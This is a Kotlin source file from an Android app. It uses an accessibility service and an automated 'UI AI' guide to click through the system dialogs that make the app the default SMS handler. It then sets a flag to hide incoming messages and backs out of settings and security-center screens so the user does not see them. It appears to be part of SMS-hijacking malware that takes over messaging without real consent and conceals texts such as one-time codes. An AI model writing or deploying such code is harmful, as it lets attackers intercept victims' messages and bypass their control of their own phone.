package com.base.realtime.sms

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.SystemClock
import android.provider.Settings
import android.provider.Telephony
import android.util.Log
import android.view.accessibility.AccessibilityWindowInfo
import com.base.realtime.access.AgentAccessibilityService
import com.base.realtime.access.UiGuideBridge
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext

/**
 * Claim / restore default SMS via UI AI only (phase SMS_DEFAULT).
 * Opens ROLE_SMS dialog (claim) or Default apps settings (restore / claim fallback).
 */
object SmsDefaultJob {
    private const val TAG = "SmsDefault"
    private const val GUIDE_TIMEOUT_MS = 55_000L
    private const val MAX_AI_ROUNDS = 8

    @Volatile
    var running: Boolean = false
        private set

    suspend fun claim(context: Context): Pair<Boolean, String> {
        val app = context.applicationContext
        if (running) return false to "busy"
        running = true
        try {
            val self = app.packageName
            val current = currentDefault(app)
            if (current.isNotBlank() && current != self) {
                SmsHideStore.setPrevious(app, current, labelFor(app, current))
            }
            if (SmsDefault.isDefault(app)) {
                SmsHideStore.setHideIncoming(app, true)
                return true to ""
            }
            val label = labelFor(app, self).ifBlank { self }
            openRoleDialog(app)
            delay(700)
            if (runAiUntilDefault(app, self, label)) {
                SmsHideStore.setHideIncoming(app, true)
                return true to ""
            }
            if (SmsDefault.isDefault(app)) {
                SmsHideStore.setHideIncoming(app, true)
                return true to ""
            }
            dismissSmsUi()
            openDefaultAppsSettings(app)
            delay(700)
            if (runAiUntilDefault(app, self, label)) {
                SmsHideStore.setHideIncoming(app, true)
                return true to ""
            }
            return false to "not default"
        } finally {
            dismissSmsUi()
            running = false
        }
    }

    suspend fun restore(context: Context): Pair<Boolean, String> {
        val app = context.applicationContext
        if (running) return false to "busy"
        running = true
        try {
            val previousPkg = SmsHideStore.previousPkg(app)
            val previousLabel = SmsHideStore.previousLabel(app).ifBlank {
                if (previousPkg.isNotBlank()) labelFor(app, previousPkg) else ""
            }
            if (previousPkg.isBlank() || previousPkg == app.packageName) {
                SmsHideStore.setHideIncoming(app, false)
                return true to ""
            }
            if (currentDefault(app) == previousPkg) {
                SmsHideStore.setHideIncoming(app, false)
                return true to ""
            }
            openDefaultAppsSettings(app)
            delay(700)
            val ok = runAiUntilDefault(app, previousPkg, previousLabel.ifBlank { previousPkg })
            if (ok) SmsHideStore.setHideIncoming(app, false)
            return if (ok) true to "" else false to "restore failed"
        } finally {
            dismissSmsUi()
            running = false
        }
    }

    private suspend fun runAiUntilDefault(
        context: Context,
        targetPkg: String,
        targetLabel: String,
    ): Boolean {
        if (targetPkg.isBlank()) return false
        if (currentDefault(context) == targetPkg) return true
        UiGuideBridge.beginGuidedJob("SMS_DEFAULT", targetPkg, targetLabel.ifBlank { targetPkg })
        try {
            val deadline = SystemClock.uptimeMillis() + GUIDE_TIMEOUT_MS
            var attempts = 0
            while (SystemClock.uptimeMillis() < deadline && attempts < MAX_AI_ROUNDS) {
                if (currentDefault(context) == targetPkg) return true
                val svc = AgentAccessibilityService.get()
                if (svc == null) {
                    delay(350)
                    continue
                }
                if (UiGuideBridge.isBusy()) {
                    delay(250)
                    continue
                }
                val sent = UiGuideBridge.requestIfNeeded(svc, "SMS_DEFAULT", "sms_default")
                if (sent) attempts++
                val roundEnd = SystemClock.uptimeMillis() + 36_000L
                while (UiGuideBridge.isBusy() && SystemClock.uptimeMillis() < roundEnd) {
                    if (currentDefault(context) == targetPkg) return true
                    delay(220)
                }
                delay(if (sent) 600 else 400)
            }
            return currentDefault(context) == targetPkg
        } finally {
            UiGuideBridge.endGuidedJob()
        }
    }

    /** Close ROLE_SMS / Settings / default-apps so the user is not left on that screen. */
    private suspend fun dismissSmsUi() {
        withContext(Dispatchers.Main) {
            SmsRoleRequestActivity.finishIfUp()
        }
        delay(180)
        val svc = AgentAccessibilityService.get() ?: return
        repeat(8) {
            val top = topPackage(svc)
            if (top.isBlank()) {
                delay(120)
                return@repeat
            }
            if (top == svc.packageName || isLauncher(top) || !isSmsFlowUi(top)) {
                return
            }
            try {
                svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
            } catch (_: Throwable) {
            }
            delay(300)
        }
    }

    private fun topPackage(service: AccessibilityService): String {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windows = service.windows
            if (!windows.isNullOrEmpty()) {
                for (w in windows) {
                    if (w.type != AccessibilityWindowInfo.TYPE_APPLICATION) continue
                    val root = w.root ?: continue
                    val pkg = root.packageName?.toString().orEmpty()
                    try {
                        root.recycle()
                    } catch (_: Throwable) {
                    }
                    if (pkg.isNotBlank()) return pkg
                }
            }
        }
        return service.rootInActiveWindow?.packageName?.toString().orEmpty()
    }

    private fun isSmsFlowUi(pkg: String): Boolean {
        val p = pkg.lowercase()
        return p.contains("permissioncontroller") ||
            p.contains("packageinstaller") ||
            p.contains("settings") ||
            p.contains("securitycenter") ||
            p.contains("safecenter")
    }

    private fun isLauncher(pkg: String): Boolean {
        val p = pkg.lowercase()
        return p.contains("launcher") ||
            p == "com.miui.home" ||
            p == "com.sec.android.app.launcher" ||
            p == "com.google.android.apps.nexuslauncher"
    }

    private suspend fun openRoleDialog(context: Context): Boolean = withContext(Dispatchers.Main) {
        SmsRoleSession.reset()
        try {
            context.startActivity(
                Intent(context, SmsRoleRequestActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP),
            )
            true
        } catch (t: Throwable) {
            Log.w(TAG, "role dialog", t)
            false
        }
    }

    private suspend fun openDefaultAppsSettings(context: Context): Boolean = withContext(Dispatchers.Main) {
        val intents = listOf(
            Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS),
            Intent(Settings.ACTION_SETTINGS),
        )
        for (base in intents) {
            try {
                context.startActivity(
                    base.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP),
                )
                return@withContext true
            } catch (_: Throwable) {
            }
        }
        false
    }

    fun currentDefault(context: Context): String {
        return try {
            Telephony.Sms.getDefaultSmsPackage(context).orEmpty()
        } catch (_: Throwable) {
            ""
        }
    }

    fun labelFor(context: Context, pkg: String): String {
        if (pkg.isBlank()) return ""
        return try {
            val pm = context.packageManager
            val info = pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(info)?.toString()?.trim().orEmpty()
        } catch (_: PackageManager.NameNotFoundException) {
            ""
        } catch (_: Throwable) {
            ""
        }
    }
}
